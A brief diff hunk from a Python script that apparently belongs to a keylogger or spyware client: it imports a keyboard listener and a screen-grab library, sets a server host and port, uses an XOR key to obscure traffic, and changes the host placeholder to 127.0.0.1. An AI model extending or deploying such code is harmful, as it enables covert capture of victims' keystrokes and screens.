@@ -13,7 +13,7 @@ from pynput.keyboard import Listener
 from PIL import ImageGrab
 
 # --- Connection Settings ---
-SERVER_HOST = "SERVER_IP"  # Replace with your server's IP address
+SERVER_HOST = "127.0.0.1"  # Replace with your server's IP address
 SERVER_PORT = 8080
 # XOR key used for lightweight traffic obfuscation
 KEY = b'simple_xor_key'
